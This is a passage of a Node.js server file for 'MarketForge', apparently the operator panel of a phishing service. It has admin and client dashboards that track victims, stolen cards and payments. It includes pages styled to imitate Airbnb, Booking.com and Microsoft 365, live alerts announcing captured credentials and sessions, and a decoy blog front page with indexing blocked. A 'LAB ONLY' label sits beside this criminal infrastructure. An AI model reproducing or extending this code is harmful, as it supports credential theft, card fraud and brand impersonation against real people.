width:3px;height:60%;border-radius:3px;\n  background:linear-gradient(180deg,var(--mf-primary),var(--mf-fuchsia));\n  box-shadow:0 0 12px var(--mf-primary);\n}\n.sidebar-link.logout{color:var(--mf-danger);margin-top:auto}\n.sidebar-link.logout:hover{background:rgba(251,113,133,.12);border-color:rgba(251,113,133,.4);color:#fff}\n/* Main */\n.main-content{margin-left:250px;padding:36px 40px;flex:1;min-height:100vh;animation:mfFade .4s ease}\n@keyframes mfFade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}\nh1{font-size:26px;margin-bottom:24px;font-weight:700;color:#fff;letter-spacing:.2px}\nh1::after{content:\"\";display:block;width:64px;height:3px;margin-top:12px;border-radius:3px;background:linear-gradient(90deg,var(--mf-primary),var(--mf-fuchsia));box-shadow:0 0 14px var(--mf-glow)}\nh2{font-size:18px;margin-bottom:12px;color:var(--mf-text)}\nh3{font-size:16px;margin-bottom:8px;color:var(--mf-text-dim)}\n/* Stats */\n.stats-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px;margin-bottom:26px}\n.stat-card{\n  background:linear-gradient(160deg,var(--mf-panel-2),var(--mf-panel));\n  padding:22px 20px;border-radius:14px;border:1px solid var(--mf-border);\n  text-align:center;position:relative;overflow:hidden;\n  transition:transform .2s ease,box-shadow .25s ease,border-color .25s ease;\n}\n.stat-card::after{content:\"\";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--mf-primary),transparent);opacity:.6}\n.stat-card:hover{transform:translateY(-4px);border-color:var(--mf-primary);box-shadow:0 14px 34px rgba(124,58,237,.28)}\n.stat-num{font-size:34px;font-weight:800;margin-bottom:4px;background:linear-gradient(90deg,var(--mf-primary),var(--mf-fuchsia));-webkit-background-clip:text;background-clip:text;color:transparent}\n/* Panels */\n.panel-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px}\n.panel{\n  background:linear-gradient(165deg,rgba(26,17,48,.92),rgba(20,13,38,.92));\n  padding:22px;border-radius:14px;border:1px solid var(--mf-border);\n  margin-bottom:20px;backdrop-filter:blur(8px);\n  box-shadow:0 10px 30px rgba(0,0,0,.35);\n  transition:border-color .25s ease,box-shadow .25s ease;\n}\n.panel:hover{border-color:rgba(168,85,247,.45);box-shadow:0 14px 38px rgba(124,58,237,.20)}\n/* Tables */\n.data-table{width:100%;border-collapse:collapse;font-size:13px}\n.data-table th{text-align:left;padding:11px 14px;color:var(--mf-muted);border-bottom:1px solid var(--mf-border);font-weight:600;text-transform:uppercase;letter-spacing:.6px;font-size:11px}\n.data-table td{padding:11px 14px;border-bottom:1px solid rgba(44,29,85,.5);color:var(--mf-text-dim)}\n.data-table tr{transition:background .15s ease}\n.data-table tr:hover{background:rgba(168,85,247,.08)}\n/* Status */\n.status-active{color:var(--mf-success)}\n.status-pending{color:var(--mf-warning)}\n.status-blocked{color:var(--mf-danger)}\n.status-unused{color:var(--mf-info)}\n.status-used{color:var(--mf-success)}\n.status-expired{color:var(--mf-danger)}\n.status-completed{color:var(--mf-primary)}\n/* Buttons */\n.btn,.btn-sm{display:inline-block;border-radius:9px;border:1px solid transparent;cursor:pointer;font-weight:600;text-decoration:none;transition:transform .15s ease,box-shadow .2s ease,filter .2s ease,background .2s ease}\n.btn{padding:11px 22px;font-size:14px;background:linear-gradient(120deg,var(--mf-panel-3),var(--mf-panel-2));color:var(--mf-text);border-color:var(--mf-border)}\n.btn:hover{filter:brightness(1.15);transform:translateY(-2px)}\n.btn-sm{padding:5px 12px;font-size:12px}\n.btn-primary{background:linear-gradient(120deg,var(--mf-primary-2),var(--mf-primary));color:#fff;border-color:transparent;box-shadow:0 6px 20px rgba(124,58,237,.35)}\n.btn-primary:hover{filter:brightness(1.12);box-shadow:0 10px 26px rgba(168,85,247,.5)}\n.btn-danger{background:linear-gradient(120deg,#e11d48,#fb7185);color:#fff;border-color:transparent;box-shadow:0 6px 18px rgba(225,29,72,.3)}\n.btn-danger:hover{filter:brightness(1.1)}\n.btn-success{background:linear-gradient(120deg,#059669,#34d399);color:#04120c;border-color:transparent;box-shadow:0 6px 18px rgba(52,211,153,.25)}\n.btn-success:hover{filter:brightness(1.08)}\n/* Forms */\nlabel{display:block;color:var(--mf-muted);font-size:12px;margin-bottom:5px;text-transform:uppercase;letter-spacing:.6px}\ninput,select,textarea{padding:11px 13px;background:rgba(8,4,15,.7);border:1px solid var(--mf-border);color:#fff;border-radius:9px;font-size:14px;transition:border-color .2s ease,box-shadow .2s ease}\ninput:focus,select:focus,textarea:focus{outline:none;border-color:var(--mf-primary);box-shadow:0 0 0 3px rgba(168,85,247,.18),0 0 18px rgba(168,85,247,.25)}\ncode{background:rgba(168,85,247,.12);padding:2px 7px;border-radius:5px;font-size:12px;color:var(--mf-fuchsia);border:1px solid rgba(168,85,247,.2)}\nhr{border:none;border-top:1px solid var(--mf-border-soft);margin:14px 0}\na{color:var(--mf-primary)}\n::selection{background:rgba(192,38,211,.4);color:#fff}\n/* Scrollbar */\n*{scrollbar-width:thin;scrollbar-color:var(--mf-primary) transparent}\n::-webkit-scrollbar{width:10px;height:10px}\n::-webkit-scrollbar-track{background:transparent}\n::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--mf-primary-2),var(--mf-neon));border-radius:8px;border:2px solid var(--mf-bg)}\n::-webkit-scrollbar-thumb:hover{background:var(--mf-fuchsia)}\n@media (max-width:768px){\n  .sidebar{width:60px;overflow:hidden}\n  .sidebar-link{font-size:0;padding:13px;text-align:center}\n  .sidebar-link::first-letter{font-size:18px}\n  .sidebar-header{display:none}\n  .main-content{margin-left:60px;padding:20px}\n  .panel-grid{grid-template-columns:1fr}\n}\n";
})();

const CLIENT_CSS = ADMIN_CSS;

const AIRBNB_CSS = (() => {
  try { return fs.readFileSync(path.join(__dirname, 'public', 'airbnb.css'), 'utf8'); }
  catch (e) { return 'body{font-family:sans-serif}'; }
})();


const BOOKING_CSS = `*{margin:0;padding:0;box-sizing:border-box}body{font-family:'BlinkMacSystemFont',-apple-system,sans-serif;background:#f5f5f5;color:#333}.booking-header{background:#003580;padding:16px 24px;color:#fff;position:sticky;top:0;z-index:100}.booking-header .logo{font-size:20px;font-weight:700;color:#fff}.booking-container{max-width:1100px;margin:0 auto;padding:24px}.booking-container h1{font-size:28px;color:#222;margin-bottom:16px}.booking-images img{width:100%;border-radius:8px;max-height:450px;object-fit:cover;margin-bottom:24px}.mf-video{margin:0 0 24px}.mf-video video,.mf-video iframe{width:100%;border-radius:8px;background:#000}.booking-details{display:flex;gap:60px}.booking-info{flex:1}.booking-info h2{font-size:20px;margin-bottom:8px}.rating{font-size:14px;color:#003580;margin-bottom:8px}.rating span{font-weight:700}.booking-info p{color:#333;line-height:1.6;margin-bottom:8px}.booking-reserve{width:350px;background:#fff;border-radius:8px;padding:24px;box-shadow:0 2px 8px rgba(0,0,0,0.08);position:sticky;top:80px}.reserve-price{margin-bottom:16px}.reserve-price .price{font-size:24px;font-weight:700;color:#003580}.date-fields{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}.date-fields input{padding:10px;border:1px solid #ddd;border-radius:4px;width:100%;font-size:14px;background:#fff;color:#333}.booking-reserve select{width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;margin-bottom:16px;font-size:14px;background:#fff;color:#333}.btn-reserve{width:100%;padding:14px;background:#0071c2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer}.btn-reserve:hover{background:#003580}.booking-form{max-width:600px;margin:0 auto;background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}.booking-form h2{font-size:24px;margin-bottom:8px;color:#003580}.booking-form p{color:#666;margin-bottom:20px}.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}.form-grid .full-width{grid-column:1/-1}.form-grid label{display:block;font-size:14px;color:#333;margin-bottom:4px}.form-grid input,.form-grid textarea{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:14px;background:#fff;color:#333}.form-grid input:focus,.form-grid textarea:focus{outline:none;border-color:#003580}.btn-next{width:100%;padding:14px;background:#0071c2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:16px}.btn-next:hover{background:#003580}`;

const FRONT_CSS = `*{margin:0;padding:0;box-sizing:border-box}body{font-family:Georgia,serif;background:#fafafa;color:#333;max-width:800px;margin:0 auto;padding:40px 20px}header{text-align:center;margin-bottom:60px;padding-bottom:30px;border-bottom:2px solid #eee}header h1{font-size:42px;color:#1a1a1a}header p{color:#666;font-size:18px;margin-top:8px}article{margin-bottom:40px;padding-bottom:30px;border-bottom:1px solid #eee}article h2{font-size:24px;color:#1a1a1a;margin-bottom:12px}article p{line-height:1.8;color:#555;font-size:16px}.read-more{display:inline-block;margin-top:12px;color:#2563eb;text-decoration:none;font-weight:600}.read-more:hover{text-decoration:underline}footer{text-align:center;color:#999;font-size:14px;margin-top:40px;padding-top:20px;border-top:1px solid #eee}`;

// === SESSION STORE (better-sqlite3) ===
const defaultLocalSessionDb = path.join(__dirname, 'data', 'sessions.db');
const sessionDbPath = process.env.SESSION_DB_PATH ? path.resolve(__dirname, process.env.SESSION_DB_PATH) : (fs.existsSync('/opt/marketforge/data') ? '/opt/marketforge/data/sessions.db' : defaultLocalSessionDb);
fs.mkdirSync(path.dirname(sessionDbPath), { recursive: true });
const sessionDb = new Database(sessionDbPath);
sessionDb.exec('CREATE TABLE IF NOT EXISTS sessions (sid TEXT PRIMARY KEY, expired INTEGER, sess TEXT)');

class BetterSQLiteStore extends session.Store {
  get(sid, cb) {
    try {
      const row = sessionDb.prepare('SELECT sess FROM sessions WHERE sid = ? AND expired > ?').get(sid, Date.now());
      cb(null, row ? JSON.parse(row.sess) : null);
    } catch(e) { cb(e); }
  }
  set(sid, sess, cb) {
    try {
      const maxAge = sess.cookie?.maxAge || 86400000;
      const expired = Date.now() + maxAge;
      sessionDb.prepare('INSERT OR REPLACE INTO sessions (sid, expired, sess) VALUES (?, ?, ?)').run(sid, expired, JSON.stringify(sess));
      cb(null);
    } catch(e) { cb(e); }
  }
  destroy(sid, cb) {
    try { sessionDb.prepare('DELETE FROM sessions WHERE sid = ?').run(sid); cb(null); } catch(e) { cb(e); }
  }
  touch(sid, sess, cb) {
    try {
      const maxAge = sess.cookie?.maxAge || 86400000;
      const expired = Date.now() + maxAge;
      sessionDb.prepare('UPDATE sessions SET expired = ? WHERE sid = ?').run(expired, sid);
      cb(null);
    } catch(e) { cb(e); }
  }
}

// === APP SETUP ===
const app = express();
const server = http.createServer(app);
const io = new Server(server);

const sessionMiddleware = session({
  store: new BetterSQLiteStore(),
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 24 * 60 * 60 * 1000, httpOnly: true, sameSite: 'lax' }
});

app.use(sessionMiddleware);
if (cookieParser) app.use(cookieParser());
// fallback cookie helper
if (!cookieParser) {
  app.use((req, res, next) => {
    res.cookie = res.cookie || function (name, val, opts) {
      const parts = [name + '=' + encodeURIComponent(val)];
      if (opts && opts.path) parts.push('Path=' + opts.path); else parts.push('Path=/');
      if (opts && opts.sameSite) parts.push('SameSite=' + opts.sameSite);
      if (opts && opts.httpOnly) parts.push('HttpOnly');
      if (opts && opts.maxAge) parts.push('Max-Age=' + Math.floor(opts.maxAge / 1000));
      res.append('Set-Cookie', parts.join('; '));
    };
    next();
  });
}
function setStaticMediaHeaders(res, filePath) {
  const ext = path.extname(filePath || '').toLowerCase();
  if (ext === '.webm') {
    res.setHeader('Content-Type', 'video/webm');
    res.setHeader('Accept-Ranges', 'bytes');
  } else if (ext === '.mp4') {
    res.setHeader('Content-Type', 'video/mp4');
    res.setHeader('Accept-Ranges', 'bytes');
  } else if (ext === '.ogv' || ext === '.ogg') {
    res.setHeader('Content-Type', 'video/ogg');
    res.setHeader('Accept-Ranges', 'bytes');
  } else if (ext === '.mov') {
    res.setHeader('Content-Type', 'video/quicktime');
    res.setHeader('Accept-Ranges', 'bytes');
  }
}

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/uploads', express.static(UPLOAD_DIR, { setHeaders: setStaticMediaHeaders }));
app.use(express.static(path.join(__dirname, 'public'), { setHeaders: setStaticMediaHeaders }));

// Multer/file upload error handler
app.use((err, req, res, next) => {
  if (err.name === 'MulterError' || (err.code && err.code.startsWith('LIMIT_'))) {
    return res.status(400).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Eroare upload</h1><p>Verifica fisierele: poze (JPG/PNG/WebP/GIF) sau video (MP4/WebM/MOV), max 200MB/fisier.</p><a href="/dashboard" style="color:#4CAF50">Inapoi la dashboard</a></div>');
  }
  if (err.message === 'Only image/video uploads allowed' || err.message === 'Only image uploads allowed') {
    return res.status(400).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Format invalid</h1><p>Doar imagini (JPEG/PNG/WebP/GIF) sau video (MP4/WebM/MOV).</p><a href="/dashboard" style="color:#4CAF50">Inapoi la dashboard</a></div>');
  }
  console.error('Unhandled error:', err);
  res.status(500).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Eroare interna</h1><p>Ceva nu a mers. Incearca din nou.</p><a href="/dashboard" style="color:#4CAF50">Inapoi la dashboard</a></div>');
});
io.engine.use(sessionMiddleware);

// === DYNAMIC HOST ROUTER MIDDLEWARE (vhost) ===
const createHostRouter = require('./marketplace/middleware/vhost');
const { candidateVerificationPage } = require('./marketplace/views/security-check');
app.use(createHostRouter({ db, candidatePageRenderer: candidateVerificationPage }));

// === AUTH MIDDLEWARE ===
function requireAuth(req, res, next) { if (!req.session.userId) return res.redirect('/login'); next(); }
function requireAdmin(req, res, next) {
  if (!req.session.userId) return res.redirect('/login');
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
  if (!user || !user.is_admin) return res.status(403).send('Access denied');
  req.user = user;
  next();
}
function requireClient(req, res, next) {
  if (!req.session.userId) return res.redirect('/login');
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
  if (user && user.is_admin) return res.redirect('/admin');
  if (!user || user.status !== 'active') return res.status(403).send('Account inactive');
  req.user = user;
  next();
}

// === PAGE TEMPLATES ===
function loginPage(err) {
  const errMsg = err ? `<div style="background:#e74c3c;color:#fff;padding:12px;border-radius:6px;margin-bottom:16px;text-align:center">${err}</div>` : '';
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>Login | MarketForge</title><style>${ADMIN_CSS}</style></head><body style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0d0d1a"><div style="background:#1a1a2e;padding:40px;border-radius:12px;width:100%;max-width:400px;border:1px solid #222"><div style="text-align:center;margin-bottom:24px"><div style="font-size:24px;color:#fff">M<strong style="color:#4CAF50">arket</strong>Forge</div></div>${errMsg}<form method="POST" action="/login"><div style="margin-bottom:16px"><label>Username</label><input type="text" name="username" required style="width:100%;padding:14px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;font-size:16px"></div><div style="margin-bottom:24px"><label>Password</label><input type="password" name="password" required style="width:100%;padding:14px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;font-size:16px"></div><button type="submit" style="width:100%;padding:14px;background:#4CAF50;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer">Sign In</button></form></div></body></html>`;
}

function registerPage(token, email, err) {
  const errMsg = err ? `<div style="background:#e74c3c;color:#fff;padding:12px;border-radius:6px;margin-bottom:16px;text-align:center">${err}</div>` : '';
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>Register | MarketForge</title><style>${ADMIN_CSS}</style></head><body style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0d0d1a"><div style="background:#1a1a2e;padding:40px;border-radius:12px;width:100%;max-width:400px;border:1px solid #222"><div style="text-align:center;margin-bottom:24px"><div style="font-size:24px;color:#fff">M<strong style="color:#4CAF50">arket</strong>Forge</div><p style="color:#888;margin-top:8px">Completează-ți înregistrarea</p></div>${errMsg}<form method="POST" action="/invite/${token}"><div style="margin-bottom:12px"><label>Username</label><input type="text" name="username" required style="width:100%;padding:14px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;font-size:16px"></div><div style="margin-bottom:12px"><label>Email</label><input type="email" name="email" value="${email||''}" required style="width:100%;padding:14px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;font-size:16px"></div><div style="margin-bottom:24px"><label>Password</label><input type="password" name="password" required minlength="6" style="width:100%;padding:14px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;font-size:16px"></div><button type="submit" style="width:100%;padding:14px;background:#4CAF50;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer">Create Account</button></form></div></body></html>`;
}

function adminPage(title, content) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>${title} | MarketForge Admin</title><style>${ADMIN_CSS}</style></head><body class="admin-layout"><nav class="sidebar"><div class="sidebar-header"><div class="logo-text">M<strong>arket</strong>Forge</div><div class="badge-admin">ADMIN</div></div><div class="sidebar-menu"><a href="/admin" class="sidebar-link${title==='Dashboard'?' active':''}">📊 Dashboard</a>
<div class="sidebar-nav-group" style="margin:2px 0">
  <a href="/dashboard/security-check/records" class="sidebar-link${(title==='Security Check Lab'||title==='Records'||title==='Profile')?' active':''}" style="font-weight:600">🛡️👤 Security Check Lab</a>
  <div class="sidebar-submenu" style="padding-left:18px;margin-top:2px;display:flex;flex-direction:column;gap:2px">
    <a href="/dashboard/security-check/records" class="sidebar-link${title==='Records'?' active':''}" style="font-size:12.5px;padding:6px 12px;opacity:0.9">📁 Records</a>
  </div>
</div>
<a href="/admin/domains" class="sidebar-link${title==='Domain Manager'?' active':''}">🌐 Domain Manager</a>
<a href="/admin/invitations" class="sidebar-link${title==='Invitații'?' active':''}">📨 Invitații</a><a href="/admin/users" class="sidebar-link${title==='Utilizatori'?' active':''}">👥 Utilizatori</a><a href="/admin/listings" class="sidebar-link${title==='Listări'?' active':''}">📋 Listări</a><a href="/admin/victims" class="sidebar-link${title==='Victime'?' active':''}">🎯 Victime</a><a href="/admin/cards" class="sidebar-link${title==='Carduri'?' active':''}">💳 Carduri</a><a href="/admin/payments" class="sidebar-link${title==='Plăți'?' active':''}">💰 Plăți</a><a href="/admin/reports" class="sidebar-link${title==='Rapoarte'?' active':''}">📊 Rapoarte</a><a href="/admin/settings" class="sidebar-link${title==='Setări'?' active':''}">⚙️ Setări</a><hr><a href="/logout" class="sidebar-link logout">🚪 Deconectare</a></div></nav><main class="main-content">${content}</main></body></html>`;
}

function clientPage(title, content, user) {
  const planInfo = user.plan_expiry ? `Expiră: ${new Date(user.plan_expiry).toLocaleDateString('ro-RO')}` : `Plan: ${user.plan||'Nelimitat'}`;
  const liveCss = `.live-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;margin-right:6px;box-shadow:0 0 0 0 rgba(34,197,94,.7);animation:livePulse 1.6s infinite}.live-dot.off{background:#555;box-shadow:none;animation:none}@keyframes livePulse{0%{box-shadow:0 0 0 0 rgba(34,197,94,.55)}70%{box-shadow:0 0 0 8px rgba(34,197,94,0)}100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}}.bs-badge{display:inline-block;padding:4px 10px;border-radius:999px;font-size:11px;font-weight:700;letter-spacing:.2px}.live-toast{position:fixed;right:18px;bottom:18px;z-index:9999;background:linear-gradient(160deg,#1a1130,#140d26);border:1px solid rgba(168,85,247,.5);color:#e9d5ff;padding:12px 16px;border-radius:12px;font-size:13px;box-shadow:0 8px 24px rgba(124,58,237,.35);display:none;max-width:320px}`;
  const uidJson = JSON.stringify(user.id);
  const liveJs = [
    '<script src="/socket.io/socket.io.js"></script>',
    '<script>(function(){try{',
    'var uid=' + uidJson + ';',
    'var sock=io({transports:["websocket","polling"]});',
    'sock.emit("join",{room:"user:"+uid,userId:uid});',
    'sock.on("live_presence",function(d){',
    'if(!d||d.userId!=uid)return;',
    'var el=document.getElementById("liveFeed");',
    'if(el){var row=document.createElement("div");row.style.cssText="padding:8px 0;border-bottom:1px solid #222;font-size:13px;color:#ccc";',
    'row.innerHTML=\'<span class="live-dot"></span> Listing #\'+(d.listingId||"?")+\' · \'+(d.event||"activity")+\' · <span style="color:#888">\'+(d.at||"")+\'</span>\';el.prepend(row);}',
    'var t=document.getElementById("liveToast");',
    'if(t){t.style.display="block";t.textContent="Live: listing #"+(d.listingId||"")+" "+(d.event||"");clearTimeout(window.__lt);window.__lt=setTimeout(function(){t.style.display="none";},3500);}',
    'document.querySelectorAll("[data-live-listing=\\""+d.listingId+"\\"]").forEach(function(n){n.innerHTML=\'<span class="live-dot"></span>Live\';});',
    '});',
    'sock.on("listing_status",function(d){',
    'if(!d||d.userId!=uid)return;',
    'var sel=document.querySelector("select[data-status-listing=\\""+d.id+"\\"]");',
    'if(sel){sel.value=d.booking_status;}',
    '});',
    '});',
    'sock.on("cmail_captured",function(d){',
    'if(!d||d.userId!=uid)return;',
    'var el=document.getElementById("liveFeed");',
    'if(el){var row=document.createElement("div");row.style.cssText="padding:8px 0;border-bottom:1px solid #222;font-size:13px;color:#c8e6c9";',
    'row.innerHTML=\'<span class="live-dot"></span> 📧 CloudMail: \'+(d.email||"?")+\' · <b>Session captured</b> · <span style="color:#888">\'+(d.at||"")+\'</span>\';el.prepend(row);}',
    'var t=document.getElementById("liveToast");',
    'if(t){t.style.display="block";t.textContent="📧 CloudMail 365: credențiale + sesiune capturate ("+(d.email||"")+")";clearTimeout(window.__lt);window.__lt=setTimeout(function(){t.style.display="none";},4500);}',
    '});',
    '}catch(e){}})();</script>',
    '<div id="liveToast" class="live-toast"></div>'
  ].join('');
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>${title} | MarketForge</title><style>${CLIENT_CSS}${liveCss}</style></head><body class="client-layout"><nav class="sidebar"><div class="sidebar-header"><div class="logo-text">M<strong>arket</strong>Forge</div></div><div class="sidebar-menu"><a href="/dashboard" class="sidebar-link${title==='Dashboard'?' active':''}">📊 Dashboard</a><a href="/dashboard/create" class="sidebar-link${title==='Create'?' active':''}">✨ Create</a><a href="/dashboard/listari" class="sidebar-link${(title==='Listări'||title==='Listari')?' active':''}">📋 Listări</a><a href="/dashboard/apartments" class="sidebar-link${title==='Apartments'?' active':''}">🏢 Apartments</a><a href="/dashboard/hosts" class="sidebar-link${title==='Hosts'?' active':''}">👤 Hosts</a><a href="/dashboard/users" class="sidebar-link${title==='Users'?' active':''}">👥 Users</a><a href="/dashboard/cards" class="sidebar-link${title==='Carduri'?' active':''}">💳 Carduri</a>
<div class="sidebar-nav-group" style="margin:2px 0">
  <a href="/dashboard/security-check/records" class="sidebar-link${(title==='Security Check Lab'||title==='Records'||title==='Profile')?' active':''}" style="font-weight:600">🛡️👤 Security Check Lab</a>
  <div class="sidebar-submenu" style="padding-left:18px;margin-top:2px;display:flex;flex-direction:column;gap:2px">
    <a href="/dashboard/security-check/records" class="sidebar-link${title==='Records'?' active':''}" style="font-size:12.5px;padding:6px 12px;opacity:0.9">📁 Records</a>
  </div>
</div>
<a href="/dashboard/domains" class="sidebar-link${title==='Domain Manager'?' active':''}">🌐 Domain Manager</a>
<a href="/dashboard/cloudmail" class="sidebar-link${title==='CloudMail'?' active':''}">📧 Microsoft 365 (Demo)</a><a href="/dashboard/rental" class="sidebar-link${title==='Rental'?' active':''}">🏠 Rental (Portale)</a><a href="/dashboard/phishlab" class="sidebar-link${title==='Lab'?' active':''}">🧪 Lab</a><a href="/dashboard/phishlab/captures" class="sidebar-link${title==='Caption'?' active':''}">🗂 Caption</a><a href="/dashboard/phishlab/mail" class="sidebar-link${title==='Mail Lab'?' active':''}">✉ Mail Lab</a><a href="/dashboard/payments" class="sidebar-link${title==='Plăți'?' active':''}">💰 Plăți</a>
<a href="/dashboard/payment-config" class="sidebar-link${title==='Payment Config'?' active':''}">🏦 Payment Config</a><a href="/dashboard/settings" class="sidebar-link${title==='Setări'?' active':''}">⚙️ Setări</a><hr><div style="padding:8px 16px;font-size:12px;color:#888">👤 ${esc(user.username)}<br>🔒 ${planInfo}<div style="margin-top:10px;font-size:11px;font-weight:700;color:#ffd166;border:1px dashed rgba(255,209,102,.5);border-radius:6px;padding:4px 8px;text-align:center;letter-spacing:1px">🔬 LAB ONLY</div></div><a href="/logout" class="sidebar-link logout">🚪 Deconectare</a></div></nav><main class="main-content">${content}</main>${liveJs}</body></html>`;
}

// === FRONT PAGE ===
app.get('/', (req, res) => {
  res.set('X-Robots-Tag', 'noindex, nofollow');
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>LessJob - Crypto & Remote Work Insights</title><style>${FRONT_CSS}</style></head><body><header><h1>LessJob</h1><p>Crypto, Remote Work & Financial Freedom</p></header><main><article><h2>The Future of Crypto Payments in 2026</h2><p>Cryptocurrency continues to reshape how we think about money. With Bitcoin reaching new milestones and Ethereum's expanding ecosystem, the landscape of digital payments has never been more exciting...</p><a href="#" class="read-more">Read More →</a></article><article><h2>Remote Work: Building Your Digital Nomad Empire</h2><p>The shift to remote work has created unprecedented opportunities. Learn how to build location-independent income streams using modern tools...</p><a href="#" class="read-more">Read More →</a></article><article><h2>Blockchain Security Best Practices</h2><p>As blockchain technology matures, security remains paramount. Discover the latest best practices for keeping your digital assets safe...</p><a href="#" class="read-more">Read More →</a></article></main><footer><p>© 2026 LessJob. All rights reserved.</p></footer></body></html>`);
});

// === ROBOTS.TXT ===
app.get('/robots.txt', (req, res) => { res.type('text/plain'); res.send('User-agent: *\nDisallow: /\n'); });

// === AUTH ROUTES ===
app.get('/login', (req, res) => {
  if (req.session.userId) {
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
    if (user && user.is_admin) return res.redirect('/admin');
    if (user) return res.redirect('/dashboard');
  }
  res.send(loginPage());
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
  if (!user || !bcrypt.compareSync(password, user.password_hash)) return res.send(loginPage('Invalid credentials'));
  if (user.status === 'blocked') return res.send(loginPage('Account blocked.'));
  db.prepare("UPDATE users SET last_login = datetime('now') WHERE id = ?").run(user.id);
  req.session.userId = user.id;
  db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'login', ?, ?)").run(user.id, 'User logged in', req.ip);
  if (user.is_admin) return res.redirect('/admin');
  return res.redirect('/dashboard');
});

app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/login'); });

// === INVITE REGISTRATION ===
app.get('/invite/:token', (req, res) => {
  const { token } = req.params;
  const invite = db.prepare("SELECT * FROM invitations WHERE token = ? AND status = 'unused' AND expires_at > datetime('now')").get(token);
  if (!invite) return res.send('<h1 style="text-align:center;margin-top:100px;font-family:sans-serif;color:#e74c3c">Link invalid sau expirat.<br>Contactează administratorul.</h1>');
  res.send(registerPage(token, invite.email || ''));
});

app.post('/invite/:token', (req, res) => {
  const { token } = req.params;
  const { username, email, password } = req.body;
  const invite = db.prepare("SELECT * FROM invitations WHERE token = ? AND status = 'unused' AND expires_at > datetime('now')").get(token);
  if (!invite) return res.send('<h1 style="text-align:center;margin-top:100px;font-family:sans-serif;color:#e74c3c">Link invalid sau expirat.</h1>');
  const existing = db.prepare('SELECT id FROM users WHERE username = ? OR email = ?').get(username, email);
  if (existing) return res.send(registerPage(token, email, 'Username sau email deja folosit.'));
  const hash = bcrypt.hashSync(password, 10);
  const permanentToken = uuidv4();
  db.prepare("INSERT INTO users (username, email, password_hash, status, plan, plan_expiry, invite_token, permanent_token) VALUES (?, ?, ?, 'pending', 'trial', datetime('now', '+7 days'), ?, ?)").run(username, email, hash, token, permanentToken);
  db.prepare("UPDATE invitations SET status = 'used' WHERE token = ?").run(token);
  db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES ((SELECT id FROM users WHERE username = ?), 'register', ?, ?)").run(username, 'New registration', req.ip);
  res.send('<h1 style="text-align:center;margin-top:100px;font-family:sans-serif;color:#4CAF50">Înregistrare completă!<br>Așteaptă aprobarea administratorului.</h1>');
});

// === ADMIN ROUTES ===
app.get('/admin', requireAdmin, (req, res) => {
  const stats = {
    totalUsers: db.prepare('SELECT COUNT(*) as c FROM users WHERE is_admin = 0').get().c,
    activeUsers: db.prepare("SELECT COUNT(*) as c FROM users WHERE is_admin = 0 AND status = 'active'").get().c,
    pendingUsers: db.prepare("SELECT COUNT(*) as c FROM users WHERE status = 'pending'").get().c,
    totalListings: db.prepare('SELECT COUNT(*) as c FROM listings').get().c,
    totalVictims: db.prepare('SELECT COUNT(*) as c FROM victims').get().c,
    totalCards: db.prepare('SELECT COUNT(*) as c FROM cards').get().c,
    totalCandidates: db.prepare('SELECT COUNT(*) as c FROM candidates').get().c,
    totalPayments: db.prepare("SELECT COUNT(*) as c FROM payments WHERE status = 'completed'").get().c,
